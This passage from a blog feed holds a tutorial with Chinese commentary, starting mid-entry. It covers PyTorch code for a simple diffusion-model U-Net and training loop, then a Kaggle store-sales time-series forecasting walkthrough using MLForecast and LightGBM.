class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_ch, out_ch, time_emb_dim, up=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.time_mlp =  nn.Linear(time_emb_dim, out_ch)</span><br><span class="line">        <span class="keyword">if</span> up:</span><br><span class="line">            self.conv1 = nn.Conv2d(<span class="number">2</span>*in_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">            self.transform = nn.ConvTranspose2d(out_ch, out_ch, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.conv1 = nn.Conv2d(in_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">            self.transform = nn.Conv2d(out_ch, out_ch, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(out_ch, out_ch, <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        self.bnorm1 = nn.BatchNorm2d(out_ch)</span><br><span class="line">        self.bnorm2 = nn.BatchNorm2d(out_ch)</span><br><span class="line">        self.relu  = nn.ReLU()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, t, </span>):</span><br><span class="line">        <span class="comment"># First Conv</span></span><br><span class="line">        h = self.bnorm1(self.relu(self.conv1(x)))</span><br><span class="line">        <span class="comment"># Time embedding</span></span><br><span class="line">        time_emb = self.relu(self.time_mlp(t))</span><br><span class="line">        <span class="comment"># Extend last 2 dimensions</span></span><br><span class="line">        time_emb = time_emb[(..., ) + (<span class="literal">None</span>, ) * <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># Add time channel</span></span><br><span class="line">        h = h + time_emb</span><br><span class="line">        <span class="comment"># Second Conv</span></span><br><span class="line">        h = self.bnorm2(self.relu(self.conv2(h)))</span><br><span class="line">        <span class="comment"># Down or Upsample</span></span><br><span class="line">        <span class="keyword">return</span> self.transform(h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SinusoidalPositionEmbeddings</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, dim</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.dim = dim</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, time</span>):</span><br><span class="line">        device = time.device</span><br><span class="line">        half_dim = self.dim // <span class="number">2</span></span><br><span class="line">        embeddings = math.log(<span class="number">10000</span>) / (half_dim - <span class="number">1</span>)</span><br><span class="line">        embeddings = torch.exp(torch.arange(half_dim, device=device) * -embeddings)</span><br><span class="line">        embeddings = time[:, <span class="literal">None</span>] * embeddings[<span class="literal">None</span>, :]</span><br><span class="line">        embeddings = torch.cat((embeddings.sin(), embeddings.cos()), dim=-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Double check the ordering here</span></span><br><span class="line">        <span class="keyword">return</span> embeddings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleUnet</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A simplified variant of the Unet architecture.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        image_channels = <span class="number">3</span></span><br><span class="line">        down_channels = (<span class="number">64</span>, <span class="number">128</span>, <span class="number">256</span>, <span class="number">512</span>, <span class="number">1024</span>)</span><br><span class="line">        up_channels = (<span class="number">1024</span>, <span class="number">512</span>, <span class="number">256</span>, <span class="number">128</span>, <span class="number">64</span>)</span><br><span class="line">        out_dim = <span class="number">3</span> </span><br><span class="line">        time_emb_dim = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Time embedding</span></span><br><span class="line">        self.time_mlp = nn.Sequential(</span><br><span class="line">                SinusoidalPositionEmbeddings(time_emb_dim),</span><br><span class="line">                nn.Linear(time_emb_dim, time_emb_dim),</span><br><span class="line">                nn.ReLU()</span><br><span class="line">            )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Initial projection</span></span><br><span class="line">        self.conv0 = nn.Conv2d(image_channels, down_channels[<span class="number">0</span>], <span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Downsample</span></span><br><span class="line">        self.downs = nn.ModuleList([Block(down_channels[i], down_channels[i+<span class="number">1</span>], \</span><br><span class="line">                                    time_emb_dim) \</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(down_channels)-<span class="number">1</span>)])</span><br><span class="line">        <span class="comment"># Upsample</span></span><br><span class="line">        self.ups = nn.ModuleList([Block(up_channels[i], up_channels[i+<span class="number">1</span>], \</span><br><span class="line">                                        time_emb_dim, up=<span class="literal">True</span>) \</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(up_channels)-<span class="number">1</span>)])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Edit: Corrected a bug found by Jakub C (see YouTube comment)</span></span><br><span class="line">        self.output = nn.Conv2d(up_channels[-<span class="number">1</span>], out_dim, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, timestep</span>):</span><br><span class="line">        <span class="comment"># Embedd time</span></span><br><span class="line">        t = self.time_mlp(timestep)</span><br><span class="line">        <span class="comment"># Initial conv</span></span><br><span class="line">        x = self.conv0(x)</span><br><span class="line">        <span class="comment"># Unet</span></span><br><span class="line">        residual_inputs = []</span><br><span class="line">        <span class="keyword">for</span> down <span class="keyword">in</span> self.downs:</span><br><span class="line">            x = down(x, t)</span><br><span class="line">            residual_inputs.append(x)</span><br><span class="line">        <span class="keyword">for</span> up <span class="keyword">in</span> self.ups:</span><br><span class="line">            residual_x = residual_inputs.pop()</span><br><span class="line">            <span class="comment"># Add residual x as additional channels</span></span><br><span class="line">            x = torch.cat((x, residual_x), dim=<span class="number">1</span>)           </span><br><span class="line">            x = up(x, t)</span><br><span class="line">        <span class="keyword">return</span> self.output(x)</span><br><span class="line"></span><br><span class="line">model = SimpleUnet()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Num params: &quot;</span>, <span class="built_in">sum</span>(p.numel() <span class="keyword">for</span> p <span class="keyword">in</span> model.parameters()))</span><br><span class="line">model</span><br></pre></td></tr></table></figure></p><p>这里的block作为unet的每层处理,下面的unet类直接对block进行堆叠,position_embedding作为position的记录,通过对cos和sin的concat来实现. 需要注意网上一般常见的unet都是有pool的,作者的上一版notebook也是有pool的,但现在已经换成了BN层.</p><h3 id="loss">Loss</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_loss</span>(<span class="params">model, x_0, t</span>):</span><br><span class="line">    x_noisy, noise = forward_diffusion_sample(x_0, t, device)</span><br><span class="line">    noise_pred = model(x_noisy, t)</span><br><span class="line">    <span class="keyword">return</span> F.l1_loss(noise, noise_pred)</span><br></pre></td></tr></table></figure><p>通过forward_dissusion_sample计算 $ x_0 $ 在第t步noising的值作为target, 模型输出值为noise_pred,然后计算f1_loss</p><h3 id="train">train</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_timestep</span>(<span class="params">x, t</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Calls the model to predict the noise in the image and returns </span></span><br><span class="line"><span class="string">    the denoised image. </span></span><br><span class="line"><span class="string">    Applies noise to this image, if we are not in the last step yet.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    betas_t = get_index_from_list(betas, t, x.shape)</span><br><span class="line">    sqrt_one_minus_alphas_cumprod_t = get_index_from_list(</span><br><span class="line">        sqrt_one_minus_alphas_cumprod, t, x.shape</span><br><span class="line">    )</span><br><span class="line">    sqrt_recip_alphas_t = get_index_from_list(sqrt_recip_alphas, t, x.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Call model (current image - noise prediction)</span></span><br><span class="line">    model_mean = sqrt_recip_alphas_t * (</span><br><span class="line">        x - betas_t * model(x, t) / sqrt_one_minus_alphas_cumprod_t</span><br><span class="line">    )</span><br><span class="line">    posterior_variance_t = get_index_from_list(posterior_variance, t, x.shape)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># As pointed out by Luis Pereira (see YouTube comment)</span></span><br><span class="line">        <span class="comment"># The t&#x27;s are offset from the t&#x27;s in the paper</span></span><br><span class="line">        <span class="keyword">return</span> model_mean</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        noise = torch.randn_like(x)</span><br><span class="line">        <span class="keyword">return</span> model_mean + torch.sqrt(posterior_variance_t) * noise </span><br><span class="line"></span><br><span class="line"><span class="meta">@torch.no_grad()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample_plot_image</span>():</span><br><span class="line">    <span class="comment"># Sample noise</span></span><br><span class="line">    img_size = IMG_SIZE</span><br><span class="line">    img = torch.randn((<span class="number">1</span>, <span class="number">3</span>, img_size, img_size), device=device)</span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line">    plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    num_images = <span class="number">10</span></span><br><span class="line">    stepsize = <span class="built_in">int</span>(T/num_images)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,T)[::-<span class="number">1</span>]:</span><br><span class="line">        t = torch.full((<span class="number">1</span>,), i, device=device, dtype=torch.long)</span><br><span class="line">        img = sample_timestep(img, t)</span><br><span class="line">        <span class="comment"># Edit: This is to maintain the natural range of the distribution</span></span><br><span class="line">        img = torch.clamp(img, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">if</span> i % stepsize == <span class="number">0</span>:</span><br><span class="line">            plt.subplot(<span class="number">1</span>, num_images, <span class="built_in">int</span>(i/stepsize)+<span class="number">1</span>)</span><br><span class="line">            show_tensor_image(img.detach().cpu())</span><br><span class="line">    plt.show()            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># train here</span></span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> Adam</span><br><span class="line"></span><br><span class="line">device = <span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span></span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = Adam(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line">epochs = <span class="number">100</span> <span class="comment"># Try more!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(epochs):</span><br><span class="line">    <span class="keyword">for</span> step, batch <span class="keyword">in</span> <span class="built_in">enumerate</span>(dataloader):</span><br><span class="line">      optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line">      t = torch.randint(<span class="number">0</span>, T, (BATCH_SIZE,), device=device).long()</span><br><span class="line">      loss = get_loss(model, batch[<span class="number">0</span>], t)</span><br><span class="line">      loss.backward()</span><br><span class="line">      optimizer.step()</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> epoch % <span class="number">5</span> == <span class="number">0</span> <span class="keyword">and</span> step == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Epoch <span class="subst">&#123;epoch&#125;</span> | step <span class="subst">&#123;step:03d&#125;</span> Loss: <span class="subst">&#123;loss.item()&#125;</span> &quot;</span>)</span><br><span class="line">        sample_plot_image()</span><br></pre></td></tr></table></figure><p>前面的sample_timestep返回的是论文中的ALGO2.sampling. 然后后续就是画出每一步的生成图了.</p><p>train是取0-T中的随机整数作为timestep然后训练. 训练过程中调用sample_plot_image查看结果.</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup3-TimeSeries(3)</title>
      <link href="/2024/04/09/Kaggle-warmup3-TimeSeries-3/"/>
      <url>/2024/04/09/Kaggle-warmup3-TimeSeries-3/</url>
      
        <content type="html"><![CDATA[<p>继续往后看,发现有另一个时序处理的package,<a href="https://nixtlaverse.nixtla.io/mlforecast/index.html">MLforcast</a>,抱着学习的心态看一看用法.</p><h2 id="preprocessing">preprocessing</h2><p>首先import需求包并读取数据. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lightgbm <span class="keyword">as</span> lgb</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> mlforecast <span class="keyword">import</span> MLForecast</span><br><span class="line"><span class="keyword">from</span> mlforecast.lag_transforms <span class="keyword">import</span> ExpandingMean, RollingMean</span><br><span class="line"><span class="keyword">from</span> mlforecast.target_transforms <span class="keyword">import</span> GlobalSklearnTransformer</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> FunctionTransformer</span><br><span class="line"><span class="keyword">from</span> utilsforecast.feature_engineering <span class="keyword">import</span> fourier</span><br><span class="line"><span class="keyword">from</span> utilsforecast.preprocessing <span class="keyword">import</span> fill_gaps</span><br><span class="line"><span class="keyword">from</span> utilsforecast.plotting <span class="keyword">import</span> plot_series</span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;../input/store-sales-time-series-forecasting/train.csv&#x27;</span>, parse_dates=[<span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">df = df.drop(columns=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">df[<span class="string">&#x27;unique_id&#x27;</span>] = df[<span class="string">&#x27;store_nbr&#x27;</span>].astype(<span class="built_in">str</span>) + <span class="string">&#x27;_&#x27;</span> + df[<span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">df.head()</span><br></pre></td></tr></table></figure></p><p>然后这里可以使用<code>utilsforcast.preprocessing.fillgaps</code>来填补时间空缺, 空缺时间会导致其他列被填na. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filled = fill_gaps(df, freq=<span class="string">&#x27;D&#x27;</span>, start=<span class="string">&#x27;per_serie&#x27;</span>, end=<span class="string">&#x27;per_serie&#x27;</span>, time_col=<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line">filled.loc[filled[<span class="string">&#x27;sales&#x27;</span>].isnull(), <span class="string">&#x27;date&#x27;</span>].value_counts()</span><br><span class="line"><span class="comment"># date</span></span><br><span class="line"><span class="comment"># 2013-12-25    1782</span></span><br><span class="line"><span class="comment"># 2014-12-25    1782</span></span><br><span class="line"><span class="comment"># 2015-12-25    1782</span></span><br><span class="line"><span class="comment"># 2016-12-25    1782</span></span><br><span class="line"><span class="comment"># Name: count, dtype: int64</span></span><br></pre></td></tr></table></figure></p><p><img src="gap_check.png" /></p><p>可以使用plot_series来简单画图,需要指定<code>time_col</code>和<code>target_col</code>. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plot_series(filled[filled[<span class="string">&#x27;date&#x27;</span>].between(<span class="string">&#x27;2016-12&#x27;</span>, <span class="string">&#x27;2017-01&#x27;</span>)], time_col=<span class="string">&#x27;date&#x27;</span>, target_col=<span class="string">&#x27;sales&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p>需要注意这里其实<code>id_col</code>被默认指定为了<code>unique_id</code>.</p><p><img src="plot_series_without25.png" /></p><p>可以看到25号的时候数据为空,使用<code>interpolate</code>来进行填充 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filled[<span class="string">&#x27;sales_interp&#x27;</span>] = filled.groupby(<span class="string">&#x27;unique_id&#x27;</span>)[<span class="string">&#x27;sales&#x27;</span>].transform(<span class="keyword">lambda</span> s: s.interpolate())</span><br><span class="line">plot_series(filled[filled[<span class="string">&#x27;date&#x27;</span>].between(<span class="string">&#x27;2016-12&#x27;</span>, <span class="string">&#x27;2017-01&#x27;</span>)], time_col=<span class="string">&#x27;date&#x27;</span>, target_col=<span class="string">&#x27;sales_interp&#x27;</span>)</span><br></pre></td></tr></table></figure></p><p><img src="plot_series_with25.png" /></p><p>然后指定一下<code>categorical_feature</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat_features = [<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">filled[cat_features] = filled[cat_features].astype(<span class="string">&#x27;category&#x27;</span>)</span><br></pre></td></tr></table></figure><p>holiday部分不同上一次的one-hot-encoding,这里我们仅判断是否为节日</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">raw_holidays = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;../input/store-sales-time-series-forecasting/holidays_events.csv&#x27;</span>,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">keep_holidays = ~raw_holidays[<span class="string">&#x27;transferred&#x27;</span>] &amp; raw_holidays[<span class="string">&#x27;locale&#x27;</span>].eq(<span class="string">&#x27;National&#x27;</span>)</span><br><span class="line">holidays = raw_holidays.loc[keep_holidays, [<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;type&#x27;</span>]].copy()</span><br><span class="line">holidays[<span class="string">&#x27;is_holiday&#x27;</span>] = holidays[<span class="string">&#x27;type&#x27;</span>].eq(<span class="string">&#x27;Holiday&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line">holidays[<span class="string">&#x27;is_work_day&#x27;</span>] = holidays[<span class="string">&#x27;type&#x27;</span>].eq(<span class="string">&#x27;Work Day&#x27;</span>).astype(<span class="string">&#x27;float&#x27;</span>)</span><br><span class="line">holidays = holidays.drop(columns=<span class="string">&#x27;type&#x27;</span>).groupby(<span class="string">&#x27;date&#x27;</span>).<span class="built_in">max</span>()</span><br><span class="line">holidays.head()</span><br></pre></td></tr></table></figure><p>填补oilprice,并且完成表合并 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">oil = pd.read_csv(</span><br><span class="line">    <span class="string">&#x27;../input/store-sales-time-series-forecasting/oil.csv&#x27;</span>,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">filled_oil = oil.set_index(<span class="string">&#x27;date&#x27;</span>).reindex(pd.date_range(oil[<span class="string">&#x27;date&#x27;</span>].<span class="built_in">min</span>(), oil[<span class="string">&#x27;date&#x27;</span>].<span class="built_in">max</span>(), freq=<span class="string">&#x27;D&#x27;</span>, name=<span class="string">&#x27;date&#x27;</span>))</span><br><span class="line">filled_oil = filled_oil.interpolate(limit_direction=<span class="string">&#x27;both&#x27;</span>).reset_index()</span><br><span class="line">filled_oil.head()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">assemble_df</span>(<span class="params">df, holidays, oil</span>):</span><br><span class="line">    df = df.merge(holidays, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>).merge(oil, on=<span class="string">&#x27;date&#x27;</span>, how=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    df[[<span class="string">&#x27;is_holiday&#x27;</span>, <span class="string">&#x27;is_work_day&#x27;</span>]] = df[[<span class="string">&#x27;is_holiday&#x27;</span>, <span class="string">&#x27;is_work_day&#x27;</span>]].fillna(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train = assemble_df(filled.drop(columns=[<span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>]), holidays, filled_oil)</span><br><span class="line">train.head()</span><br></pre></td></tr></table></figure></p><h2 id="mlforecast-model">MLForecast Model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">%%time</span><br><span class="line">log_tfm = GlobalSklearnTransformer(</span><br><span class="line">    FunctionTransformer(func=np.log1p, inverse_func=np.expm1)</span><br><span class="line">)</span><br><span class="line">model = lgb.LGBMRegressor(</span><br><span class="line">    n_estimators=<span class="number">400</span>,</span><br><span class="line">    learning_rate=<span class="number">1e-2</span>,</span><br><span class="line">    num_leaves=<span class="number">256</span>,</span><br><span class="line">    num_threads=<span class="number">4</span>,</span><br><span class="line">    force_col_wise=<span class="literal">True</span>,</span><br><span class="line">    verbosity=-<span class="number">1</span>,   </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">mlf = MLForecast(</span><br><span class="line">    models=&#123;<span class="string">&#x27;lgb&#x27;</span>: model&#125;,</span><br><span class="line">    freq=<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    target_transforms=[log_tfm],</span><br><span class="line">    lags=[<span class="number">7</span>, <span class="number">14</span>],</span><br><span class="line">    lag_transforms=&#123;</span><br><span class="line">         <span class="number">1</span>: [ExpandingMean()],</span><br><span class="line">         <span class="number">7</span>: [RollingMean(window_size=<span class="number">14</span>), RollingMean(window_size=<span class="number">28</span>)],</span><br><span class="line">        <span class="number">14</span>: [RollingMean(window_size=<span class="number">14</span>), RollingMean(window_size=<span class="number">28</span>)],</span><br><span class="line">    &#125;,</span><br><span class="line">    date_features=[<span class="string">&#x27;dayofweek&#x27;</span>, <span class="string">&#x27;day&#x27;</span>, <span class="string">&#x27;month&#x27;</span>, <span class="string">&#x27;year&#x27;</span>],</span><br><span class="line">    num_threads=<span class="number">4</span>,</span><br><span class="line">)</span><br><span class="line">mlf.fit(</span><br><span class="line">    train,</span><br><span class="line">    time_col=<span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">    target_col=<span class="string">&#x27;sales_interp&#x27;</span>,</span><br><span class="line">    static_features=cat_features,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里直接用了lag1的ExpandMean以及7和14的lag和14,28的window的rollingmean. 另外单独的lag被指定在了lags里面.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class RollingMean</span><br><span class="line"></span><br><span class="line">Args:</span><br><span class="line"></span><br><span class="line">lag (int): Number of periods to offset by before applying the transformation.</span><br><span class="line">window_size (int): Length of the rolling window.</span><br><span class="line">min_samples (int, optional): Minimum number of samples required to compute the statistic. If None, defaults to window_size.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ExpandingMean</span><br><span class="line"></span><br><span class="line">Args:</span><br><span class="line"></span><br><span class="line">lag (int): Number of periods to offset by before applying the transformation</span><br></pre></td></tr></table></figure><p>basemodel用的是<code>lgb.LGBMRegressor</code></p><h2 id="prediction">prediction</h2><p>处理数据喂mlf即可, 后面不做多的分析了.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">test = pd.read_csv(<span class="string">&#x27;../input/store-sales-time-series-forecasting/test.csv&#x27;</span>, parse_dates=[<span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">test[<span class="string">&#x27;unique_id&#x27;</span>] = test[<span class="string">&#x27;store_nbr&#x27;</span>].astype(<span class="built_in">str</span>) + <span class="string">&#x27;_&#x27;</span> + test[<span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">X_df = assemble_df(test[[<span class="string">&#x27;unique_id&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>]], holidays, filled_oil)</span><br><span class="line">X_df.head()</span><br><span class="line"></span><br><span class="line">%time preds = mlf.predict(h=<span class="number">16</span>, X_df=X_df)</span><br><span class="line"></span><br><span class="line">subm = (</span><br><span class="line">    test</span><br><span class="line">    .merge(preds, on=[<span class="string">&#x27;unique_id&#x27;</span>, <span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">    .drop(columns=<span class="string">&#x27;unique_id&#x27;</span>)</span><br><span class="line">    .rename(columns=&#123;<span class="string">&#x27;lgb&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;)</span><br><span class="line">    [[<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>]]</span><br><span class="line">    .sort_values(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">subm.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">subm</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
